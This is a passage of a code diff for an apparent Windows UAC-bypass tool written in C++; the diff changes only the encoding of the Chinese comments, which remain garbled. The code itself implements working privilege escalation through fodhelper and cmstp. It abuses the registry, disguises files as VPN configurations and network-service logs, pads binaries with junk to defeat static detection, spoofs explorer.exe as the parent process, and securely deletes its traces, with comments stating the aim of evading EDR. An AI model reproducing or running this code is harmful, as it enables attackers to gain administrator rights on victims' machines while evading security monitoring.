-    // 2. »ìÏıÃüÁî£ºÍ¨¹ıBase64±àÂë + »·¾³±äÁ¿×¢Èë£¨±£ÁôÔ­ÓĞ»ìÏı»úÖÆ£©
+    // 2. æ··æ·†å‘½ä»¤ï¼šé€šè¿‡Base64ç¼–ç  + ç¯å¢ƒå˜é‡æ³¨å…¥ï¼ˆä¿ç•™åŸæœ‰æ··æ·†æœºåˆ¶ï¼‰
     std::wstring randomEnvVar = GetRandomString(4);
     std::wstring cmd = L"cmd.exe /c \"set " + randomEnvVar + L"= && " +
         ObfuscateCommand(payload) + L" && set " + randomEnvVar + L"=\"";
 
-    // 3. ×¢²á±í²Ù×÷Ç¿»¯£¨Ìí¼ÓÎ±ÔìÇ©Ãû½µµÍEDR¾¯¾õĞÔ£¬±£ÁôÔ­ÓĞ»úÖÆ£©
+    // 3. æ³¨å†Œè¡¨æ“ä½œå¼ºåŒ–ï¼ˆæ·»åŠ ä¼ªé€ ç­¾åé™ä½EDRè­¦è§‰æ€§ï¼Œä¿ç•™åŸæœ‰æœºåˆ¶ï¼‰
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, fullRegPath.c_str(), 0, NULL,
         REG_OPTION_VOLATILE | REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
         return false;
 
-    // ÉèÖÃºÏ·¨Íâ¹ÛµÄÄ¬ÈÏÖµ£¨Ä£·ÂÎ¢ÈíÇ©Ãû³ÌĞò£©
+    // è®¾ç½®åˆæ³•å¤–è§‚çš„é»˜è®¤å€¼ï¼ˆæ¨¡ä»¿å¾®è½¯ç­¾åç¨‹åºï¼‰
     RegSetValueExW(hKey, NULL, 0, REG_SZ,
         reinterpret_cast<const BYTE*>(L"\"C:\\Program Files\\Common Files\\VPNClient\\vpnui.exe\""),
         68 * sizeof(wchar_t));
 
-    // ÑÓ³Ù´¥·¢£ºÌí¼ÓËæ»úË¯Ãß²ÎÊı¸ÉÈÅĞĞÎª·ÖÎö
+    // å»¶è¿Ÿè§¦å‘ï¼šæ·»åŠ éšæœºç¡çœ å‚æ•°å¹²æ‰°è¡Œä¸ºåˆ†æ
     RegSetValueExW(hKey, L"SleepDelay", 0, REG_SZ,
         reinterpret_cast<const BYTE*>(std::to_wstring(rand() % 1500 + 500).c_str()),
         8 * sizeof(wchar_t));
@@ -853,39 +853,39 @@ bool UacmeBypass::Method_FodHelper(const fs::path& payload) {
         reinterpret_cast<const BYTE*>(L""), sizeof(wchar_t));
     RegCloseKey(hKey);
 
-    // 4. ÎÄ¼ş²Ù×÷Éî¶È»ìÏı£¨±£ÁôÔ­ÓĞ»úÖÆ£©
+    // 4. æ–‡ä»¶æ“ä½œæ·±åº¦æ··æ·†ï¼ˆä¿ç•™åŸæœ‰æœºåˆ¶ï¼‰
     fs::path fodhelperPath = GetSystemDirectory() + L"fodhelper.exe";
-    std::wstring fakeName = L"wlansvc_" + GetRandomString(4) + L".log"; // Î±×°ÍøÂç·şÎñÈÕÖ¾
+    std::wstring fakeName = L"wlansvc_" + GetRandomString(4) + L".log"; // ä¼ªè£…ç½‘ç»œæœåŠ¡æ—¥å¿—
     fs::path tempFodhelper = GetTempDirectory() / fakeName;
 
-    // ×¢ÈëÀ¬»øÊı¾İÆÆ»µ¾²Ì¬ÌØÕ÷£¨Ç°1KBÌî³äËæ»úÊı¾İ£©
+    // æ³¨å…¥åƒåœ¾æ•°æ®ç ´åé™æ€ç‰¹å¾ï¼ˆå‰1KBå¡«å……éšæœºæ•°æ®ï¼‰
     std::vector<BYTE> junkData(1024);
     std::generate(junkData.begin(), junkData.end(), []() { return rand() % 256; });
     std::ofstream(tempFodhelper, std::ios::binary).write(
         reinterpret_cast<const char*>(junkData.data()), junkData.size()
     );
 
-    // ×·¼ÓÕæÊµfodhelper.exe²¢±£ÁôÇ©ÃûÊôĞÔ
+    // è¿½åŠ çœŸå®fodhelper.exeå¹¶ä¿ç•™ç­¾åå±æ€§
     AppendFile(fodhelperPath, tempFodhelper);
-    CloneFileAttributes(fodhelperPath, tempFodhelper); // ¿ËÂ¡Ô´ÎÄ¼şÊ±¼ä´Á/ÊôĞÔ
+    CloneFileAttributes(fodhelperPath, tempFodhelper); // å…‹éš†æºæ–‡ä»¶æ—¶é—´æˆ³/å±æ€§
 
-    // 5. ½ø³ÌÁ´Î±×°£¨Í¨¹ıexplorer.exe¸¸½ø³Ì´¥·¢£©
+    // 5. è¿›ç¨‹é“¾ä¼ªè£…ï¼ˆé€šè¿‡explorer.exeçˆ¶è¿›ç¨‹è§¦å‘ï¼‰
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
     sei.lpFile = L"explorer.exe";
-    sei.lpParameters = (L"/factory," + randomKey).c_str(); // ¹¤³§Ä£Ê½Òş²Ø´°¿Ú
+    sei.lpParameters = (L"/factory," + randomKey).c_str(); // å·¥å‚æ¨¡å¼éšè—çª—å£
     sei.fMask = SEE_MASK_NO_CONSOLE | SEE_MASK_FLAG_NO_UI;
     sei.nShow = SW_HIDE;
     if (!ShellExecuteExW(&sei)) return false;
 
-    // 6. ÈıÖØÇåÀí±£ÕÏ£¨×¢²á±í+ÎÄ¼ş+½ø³Ì£¬±£ÁôÔ­ÓĞ»úÖÆ£©
+    // 6. ä¸‰é‡æ¸…ç†ä¿éšœï¼ˆæ³¨å†Œè¡¨+æ–‡ä»¶+è¿›ç¨‹ï¼Œä¿ç•™åŸæœ‰æœºåˆ¶ï¼‰
     CleanupAfterProcess(L"explorer.exe", [this, fullRegPath, tempFodhelper]() {
-        // µİ¹éÉ¾³ı×¢²á±íÏî£¨¶Ô¿¹×¢²á±í¼à¿Ø£©
+        // é€’å½’åˆ é™¤æ³¨å†Œè¡¨é¡¹ï¼ˆå¯¹æŠ—æ³¨å†Œè¡¨ç›‘æ§ï¼‰
         SHDeleteKeyW(HKEY_CURRENT_USER, fullRegPath.substr(0, fullRegPath.find_last_of(L'\\')).c_str());
 
-        // ÎÄ¼ş·ÛËé£¨3´Î¸²¸ÇĞ´Èë + ÖØÃüÃûÉ¾³ı£©
+        // æ–‡ä»¶ç²‰ç¢ï¼ˆ3æ¬¡è¦†ç›–å†™å…¥ + é‡å‘½ååˆ é™¤ï¼‰
         SecureDelete(tempFodhelper);
 
-        // ÇåÀí²ĞÁô½ø³Ì£¨°üÀ¨¿ÉÄÜ´æÔÚµÄdllhost.exe£©
+        // æ¸…ç†æ®‹ç•™è¿›ç¨‹ï¼ˆåŒ…æ‹¬å¯èƒ½å­˜åœ¨çš„dllhost.exeï¼‰
         system("taskkill /IM fodhelper.exe /F /T >nul 2>&1");
         system("taskkill /IM dllhost.exe /F /T >nul 2>&1");
         });
@@ -895,38 +895,38 @@ bool UacmeBypass::Method_FodHelper(const fs::path& payload) {
 bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
     const std::wstring sysDir = GetSystemDirectory();
 
-    // 1. ¶¯Ì¬Éú³É¸ß¶È»ìÏıµÄINFÎÄ¼şÃûÓëÂ·¾¶£¨±£Áô»ìÏı£©
-    std::wstring infName = L"VPN_" + GetRandomString(6) + L".inf"; // Î±×°³ÉVPNÅäÖÃ
+    // 1. åŠ¨æ€ç”Ÿæˆé«˜åº¦æ··æ·†çš„INFæ–‡ä»¶åä¸è·¯å¾„ï¼ˆä¿ç•™æ··æ·†ï¼‰
+    std::wstring infName = L"VPN_" + GetRandomString(6) + L".inf"; // ä¼ªè£…æˆVPNé…ç½®
     fs::path infPath = GetTempDirectory() / infName;
-    std::wstring randomExt = L"." + GetRandomString(3); // ¶ÌÀ©Õ¹Ãû½µµÍ»³ÒÉ
-    std::wstring randomType = L"VPNConfig_" + GetRandomString(8); // Î±×°³ÉVPNÅäÖÃÀàĞÍ
+    std::wstring randomExt = L"." + GetRandomString(3); // çŸ­æ‰©å±•åé™ä½æ€€ç–‘
+    std::wstring randomType = L"VPNConfig_" + GetRandomString(8); // ä¼ªè£…æˆVPNé…ç½®ç±»å‹
 
-    // 2. ¹¹½¨¸ßÃÔ»óĞÔINFÄÚÈİ£¨¹Ø¼üÓÅ»¯£¬±£Áô»ìÏı£©
+    // 2. æ„å»ºé«˜è¿·æƒ‘æ€§INFå†…å®¹ï¼ˆå…³é”®ä¼˜åŒ–ï¼Œä¿ç•™æ··æ·†ï¼‰
     std::ofstream infFile(infPath);
     if (!infFile) return false;
 
-    // Ìí¼ÓºÏ·¨VPNÅäÖÃ×Ö¶Î
+    // æ·»åŠ åˆæ³•VPNé…ç½®å­—æ®µ
     infFile << "[version]\n"
         << "Signature=$chicago$\n"
         << "AdvancedINF=2.5\n\n"
         << "[DefaultInstall]\n"
         << "CustomDestination=CustInstDest\n"
-        << "RunPreSetupCommands=PreCommands\n\n"  // ¹Ø¼üÖ´ĞĞµã
+        << "RunPreSetupCommands=PreCommands\n\n"  // å…³é”®æ‰§è¡Œç‚¹
         << "[PreCommands]\n"
-        << "cmd.exe /c \"" << payload.string() << "\"\n"    // Ê¹ÓÃcmd.exeÖ´ĞĞPayload
-        << "taskkill /IM cmstp.exe /F /T\n\n"     // Ç¿ÖÆÖÕÖ¹½ø³Ì¼õÉÙºÛ¼£
+        << "cmd.exe /c \"" << payload.string() << "\"\n"    // ä½¿ç”¨cmd.exeæ‰§è¡ŒPayload
+        << "taskkill /IM cmstp.exe /F /T\n\n"     // å¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹å‡å°‘ç—•è¿¹
         << "[CustInstDest]\n"
-        << "49000,49001=AllUserSection, 7\n\n"    // ºÏ·¨ÅäÖÃ¶Î
+        << "49000,49001=AllUserSection, 7\n\n"    // åˆæ³•é…ç½®æ®µ
         << "[AllUserSection]\n"
         << "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\","
         << "\"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n"
         << "[Strings]\n"
-        << "ServiceName=\"VPNService\"\n";         // Î±×°·şÎñÃû
+        << "ServiceName=\"VPNService\"\n";         // ä¼ªè£…æœåŠ¡å
     infFile.close();
 
-    // 3. ×¢²á±í²Ù×÷ÔöÇ¿Òş±ÎĞÔ£¨±£ÁôÔ­ÓĞ»úÖÆ£©
+    // 3. æ³¨å†Œè¡¨æ“ä½œå¢å¼ºéšè”½æ€§ï¼ˆä¿ç•™åŸæœ‰æœºåˆ¶ï¼‰
     HKEY hKey;
-    // Ê¹ÓÃREGFORCE_BACKUP_RESTOREÈ¨ÏŞÈÆ¹ıĞ´±£»¤
+    // ä½¿ç”¨REGFORCE_BACKUP_RESTOREæƒé™ç»•è¿‡å†™ä¿æŠ¤
     if (RegCreateKeyExW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomExt).c_str(), 0, NULL,
         REG_OPTION_VOLATILE | REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
         return false;
@@ -936,7 +936,7 @@ bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
         static_cast<DWORD>((randomType.size() + 1) * sizeof(wchar_t)));
     RegCloseKey(hKey);
 
-    // 4. ÃüÁîÖ´ĞĞÁ÷³ÌÓÅ»¯£¨±ÜÃâ½ø³ÌÁ´¿ÉÒÉ£©
+    // 4. å‘½ä»¤æ‰§è¡Œæµç¨‹ä¼˜åŒ–ï¼ˆé¿å…è¿›ç¨‹é“¾å¯ç–‘ï¼‰
     std::wstring cmd = L"\"" + sysDir + L"cmstp.exe\" /s /au \"" + infPath.wstring() + L"\"";
     if (RegCreateKeyExW(HKEY_CURRENT_USER,
         (L"Software\\Classes\\" + randomType + L"\\shell\\open\\command").c_str(),
@@ -948,7 +948,7 @@ bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
         static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
     RegCloseKey(hKey);
 
-    // 5. Í¨¹ıCOM½Ó¿Ú¾²Ä¬´¥·¢£¨ÎŞ´°¿Ú£©
+    // 5. é€šè¿‡COMæ¥å£é™é»˜è§¦å‘ï¼ˆæ— çª—å£ï¼‰
     CoInitialize(NULL);
     IUnknown* pUnknown = nullptr;
     HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IUnknown, (void**)&pUnknown);
@@ -956,8 +956,8 @@ bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
         IShellLinkW* psl = nullptr;
         hr = pUnknown->QueryInterface(IID_IShellLinkW, (void**)&psl);
         if (SUCCEEDED(hr)) {
-            // Ê¹ÓÃÏµÍ³¹¤¾ßÎ±×°¸¸½ø³Ì
-            psl->SetPath(L"explorer.exe");  // Ö±½Ó´«µİ¿í×Ö·û´®Ö¸Õë
+            // ä½¿ç”¨ç³»ç»Ÿå·¥å…·ä¼ªè£…çˆ¶è¿›ç¨‹
+            psl->SetPath(L"explorer.exe");  // ç›´æ¥ä¼ é€’å®½å­—ç¬¦ä¸²æŒ‡é’ˆ
             psl->SetArguments((L"testfile" + randomExt).c_str());
 
             IPersistFile* ppf = nullptr;
@@ -972,7 +972,7 @@ bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
                     sei.fMask = SEE_MASK_NO_CONSOLE | SEE_MASK_FLAG_NO_UI;
                     ShellExecuteExW(&sei);
                 }
-                SecureDelete(lnkPath); // Á¢¼´É¾³ıLNK
+                SecureDelete(lnkPath); // ç«‹å³åˆ é™¤LNK
                 ppf->Release();
             }
             psl->Release();
@@ -981,21 +981,21 @@ bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
     }
     CoUninitialize();
 
-    // 6. ÈıÖØÇåÀí±£ÕÏ£¨×¢²á±í+ÎÄ¼ş+½ø³Ì£¬±£ÁôÔ­ÓĞ»úÖÆ£©
+    // 6. ä¸‰é‡æ¸…ç†ä¿éšœï¼ˆæ³¨å†Œè¡¨+æ–‡ä»¶+è¿›ç¨‹ï¼Œä¿ç•™åŸæœ‰æœºåˆ¶ï¼‰
     CleanupAfterProcess(L"cmstp.exe", [this, randomExt, randomType, infPath]() {
-        // µİ¹éÉ¾³ı×¢²á±íÏî
+        // é€’å½’åˆ é™¤æ³¨å†Œè¡¨é¡¹
         SHDeleteKeyW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomExt).c_str());
         SHDeleteKeyW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomType).c_str());
 
-        // ÎÄ¼ş·ÛËé£¨¸²¸ÇĞ´Èë+É¾³ı£©
+        // æ–‡ä»¶ç²‰ç¢ï¼ˆè¦†ç›–å†™å…¥+åˆ é™¤ï¼‰
         SecureDelete(infPath);
 
-        // ÇåÀíCMSTP²ĞÁô½ø³Ì
+        // æ¸…ç†CMSTPæ®‹ç•™è¿›ç¨‹
         system("taskkill /IM cmstp.exe /F");
         });
     return true;
 }
-// ===================== ¸¨Öúº¯Êı =====================
+// ===================== è¾…åŠ©å‡½æ•° =====================
 bool IsElevated() {
     BOOL elevated = FALSE;
     HANDLE hToken = NULL;
@@ -1026,16 +1026,16 @@ std::wstring GetLastErrorAsString() {
 }
 
 void RunSilentAdminTask() {
-    // Êµ¼ÊµÄ¹ÜÀíÔ±ÈÎÎñ´úÂë
-    // ÀıÈç£ºĞŞ¸ÄÏµÍ³ÉèÖÃ¡¢°²×°·şÎñµÈ
+    // å®é™…çš„ç®¡ç†å‘˜ä»»åŠ¡ä»£ç 
+    // ä¾‹å¦‚ï¼šä¿®æ”¹ç³»ç»Ÿè®¾ç½®ã€å®‰è£…æœåŠ¡ç­‰
 
-    // Ê¾Àı£º´´½¨¹ÜÀíÔ±ÎÄ¼ş
+    // ç¤ºä¾‹ï¼šåˆ›å»ºç®¡ç†å‘˜æ–‡ä»¶
     std::ofstream adminFile("C:\\Windows\\System32\\admin_success.txt");
     adminFile << "Administrator privileges obtained at "
         << std::chrono::system_clock::now().time_since_epoch().count();
     adminFile.close();
 
-    // ÏÔÊ¾³É¹¦ÏûÏ¢
+    // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
     MessageBoxW(
         NULL,
         L"Administrator privileges have been successfully obtained.\nSystem security operations completed.",
@@ -1044,19 +1044,19 @@ void RunSilentAdminTask() {
     );
 }
 
-// ===================== ·ÀÖ¹¶àÊµÀıÔËĞĞµÄ»úÖÆ =====================
-// ¼ì²éÊÇ·ñÒÑÓĞÊµÀıÔËĞĞ£¬²¢±£ÁôÈ¨ÏŞ¸ü¸ßµÄÊµÀı
+// ===================== é˜²æ­¢å¤šå®ä¾‹è¿è¡Œçš„æœºåˆ¶ =====================
+// æ£€æŸ¥æ˜¯å¦å·²æœ‰å®ä¾‹è¿è¡Œï¼Œå¹¶ä¿ç•™æƒé™æ›´é«˜çš„å®ä¾‹
 bool CheckExistingInstance() {
-    // ´´½¨»¥³âÌåÈ·±£Ö»ÓĞÒ»¸öÊµÀıÔËĞĞ
+    // åˆ›å»ºäº’æ–¥ä½“ç¡®ä¿åªæœ‰ä¸€ä¸ªå®ä¾‹è¿è¡Œ
     HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\UacmeBypassInstance");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        // ÒÑÓĞÊµÀıÔËĞĞ£¬¼ì²éÈ¨ÏŞ
+        // å·²æœ‰å®ä¾‹è¿è¡Œï¼Œæ£€æŸ¥æƒé™
         BOOL currentElevated = IsElevated();
 
-        // ³¢ÊÔ´ò¿ªÏÖÓĞÊµÀıµÄ»¥³âÌåÒÔ»ñÈ¡ÆäÈ¨ÏŞĞÅÏ¢
+        // å°è¯•æ‰“å¼€ç°æœ‰å®ä¾‹çš„äº’æ–¥ä½“ä»¥è·å–å…¶æƒé™ä¿¡æ¯
         HANDLE hExistingMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\UacmeBypassInstance");
         if (hExistingMutex) {
-            // »ñÈ¡ÏÖÓĞÊµÀıµÄÈ¨ÏŞ£¨¼ò»¯´¦Àí£¬Êµ¼ÊÓ¦ÓÃÖĞ¿ÉÄÜĞèÒª¸ü¸´ÔÓµÄIPC£©
+            // è·å–ç°æœ‰å®ä¾‹çš„æƒé™ï¼ˆç®€åŒ–å¤„ç†ï¼Œå®é™…åº”ç”¨ä¸­å¯èƒ½éœ€è¦æ›´å¤æ‚çš„IPCï¼‰
             BOOL existingElevated = FALSE;
             DWORD size = 0;
             if (GetKernelObjectSecurity(hExistingMutex, OWNER_SECURITY_INFORMATION, NULL, 0, &size) ||
@@ -1066,7 +1066,7 @@ bool CheckExistingInstance() {
                     PSID pOwnerSid = NULL;
                     BOOL ownerDefaulted = FALSE;
                     if (GetSecurityDescriptorOwner(pSD, &pOwnerSid, &ownerDefaulted)) {
-                        // ¼ì²éËùÓĞÕßÊÇ·ñÎª¹ÜÀíÔ±×é
+                        // æ£€æŸ¥æ‰€æœ‰è€…æ˜¯å¦ä¸ºç®¡ç†å‘˜ç»„
                         SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
                         PSID pAdminSid = NULL;
                         if (AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid)) {
@@ -1079,35 +1079,35 @@ bool CheckExistingInstance() {
             }
             CloseHandle(hExistingMutex);
 
-            // ±È½ÏÈ¨ÏŞ£¬±£ÁôÈ¨ÏŞ¸ü¸ßµÄÊµÀı
+            // æ¯”è¾ƒæƒé™ï¼Œä¿ç•™æƒé™æ›´é«˜çš„å®ä¾‹
             if (existingElevated && !currentElevated) {
-                // ÒÑÓĞ¹ÜÀíÔ±È¨ÏŞÊµÀıÔËĞĞ£¬µ±Ç°ÆÕÍ¨È¨ÏŞÊµÀıÍË³ö
+                // å·²æœ‰ç®¡ç†å‘˜æƒé™å®ä¾‹è¿è¡Œï¼Œå½“å‰æ™®é€šæƒé™å®ä¾‹é€€å‡º
                 return true;
             }
             else if (!existingElevated && currentElevated) {
-                // µ±Ç°ÊÇ¹ÜÀíÔ±È¨ÏŞ£¬ÒÑÓĞÆÕÍ¨È¨ÏŞÊµÀıÔËĞĞ
-                // ¿ÉÒÔÍ¨ÖªÆÕÍ¨È¨ÏŞÊµÀıÍË³ö£¨´Ë´¦¼ò»¯´¦Àí£¬Ö±½Ó¼ÌĞøÔËĞĞ£©
+                // å½“å‰æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œå·²æœ‰æ™®é€šæƒé™å®ä¾‹è¿è¡Œ
+                // å¯ä»¥é€šçŸ¥æ™®é€šæƒé™å®ä¾‹é€€å‡ºï¼ˆæ­¤å¤„ç®€åŒ–å¤„ç†ï¼Œç›´æ¥ç»§ç»­è¿è¡Œï¼‰
                 return false;
             }
         }
 
-        // Èç¹ûÎŞ·¨È·¶¨È¨ÏŞ£¬Ä¬ÈÏÍË³öµ±Ç°ÊµÀı
+        // å¦‚æœæ— æ³•ç¡®å®šæƒé™ï¼Œé»˜è®¤é€€å‡ºå½“å‰å®ä¾‹
         return true;
     }
 
-    // µ±Ç°ÊÇµÚÒ»¸öÊµÀı
+    // å½“å‰æ˜¯ç¬¬ä¸€ä¸ªå®ä¾‹
     return false;
 }
 
 int admin() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    // ¼ì²éÊÇ·ñÒÑÓĞÊµÀıÔËĞĞ£¬²¢±£ÁôÈ¨ÏŞ¸ü¸ßµÄÊµÀı
+    // æ£€æŸ¥æ˜¯å¦å·²æœ‰å®ä¾‹è¿è¡Œï¼Œå¹¶ä¿ç•™æƒé™æ›´é«˜çš„å®ä¾‹
     if (CheckExistingInstance()) {
-        return 0; // ÒÑÓĞ¸ü¸ßÈ¨ÏŞÊµÀıÔËĞĞ£¬µ±Ç°ÊµÀıÍË³ö
+        return 0; // å·²æœ‰æ›´é«˜æƒé™å®ä¾‹è¿è¡Œï¼Œå½“å‰å®ä¾‹é€€å‡º
     }
 
-    // ¼ì²éÃüÁîĞĞ²ÎÊı£¬ÅĞ¶ÏÊÇ·ñÒÑ¾­ÊÇÌáÈ¨ºóµÄÊµÀı
+    // æ£€æŸ¥å‘½ä»¤è¡Œå‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦å·²ç»æ˜¯ææƒåçš„å®ä¾‹
     int argc;
     LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     bool isElevatedInstance = false;
@@ -1132,8 +1132,8 @@ int admin() {
         return 1;
     }
 
-    // ĞŞ¸Ä£º´´½¨ÁÙÊ±¸±±¾Ê±Ê¹ÓÃ.exeÀ©Õ¹Ãû
-    auto tempFilePath = bypass.CreateTempFile(L".exe"); // ¸ÄÎª.exeÀ©Õ¹Ãû
+    // ä¿®æ”¹ï¼šåˆ›å»ºä¸´æ—¶å‰¯æœ¬æ—¶ä½¿ç”¨.exeæ‰©å±•å
+    auto tempFilePath = bypass.CreateTempFile(L".exe"); // æ”¹ä¸º.exeæ‰©å±•å
     if (tempFilePath.empty()) {
         std::wstring errorMsg = L"Failed to create temp file. Error: " + GetLastErrorAsString();
         MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
@@ -1149,13 +1149,13 @@ int admin() {
 
     bypass.SetRandomFileTime(tempFilePath);
 
-    // ĞŞ¸Ä£ºÕıÈ·¹¹½¨ÃüÁîĞĞ²ÎÊı
+    // ä¿®æ”¹ï¼šæ­£ç¡®æ„å»ºå‘½ä»¤è¡Œå‚æ•°
     std::wstring commandLine = L"\"" + tempFilePath.wstring() + L"\" /elevated";
 
-    // ĞŞ¸Ä£ºÊ¹ÓÃ´øÖØÊÔ»úÖÆµÄ×Ô¶¯ÈÆ¹ı£¬´«µİÕıÈ·µÄÃüÁîĞĞ
+    // ä¿®æ”¹ï¼šä½¿ç”¨å¸¦é‡è¯•æœºåˆ¶çš„è‡ªåŠ¨ç»•è¿‡ï¼Œä¼ é€’æ­£ç¡®çš„å‘½ä»¤è¡Œ
     if (bypass.AutoBypassWithRetry(commandLine, 3)) {
         std::this_thread::sleep_for(std::chrono::seconds(3));
-        // ÑÓ³ÙÉ¾³ıÁÙÊ±¸±±¾
+        // å»¶è¿Ÿåˆ é™¤ä¸´æ—¶å‰¯æœ¬
         std::thread([tempFilePath]() {
             std::this_thread::sleep_for(std::chrono::seconds(5));
             fs::remove(tempFilePath);
@@ -1167,4 +1167,5 @@ int admin() {
     std::wstring errorMsg = L"UAC bypass failed. Error: " + GetLastErrorAsString();
     MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
     return 1;
+
 }
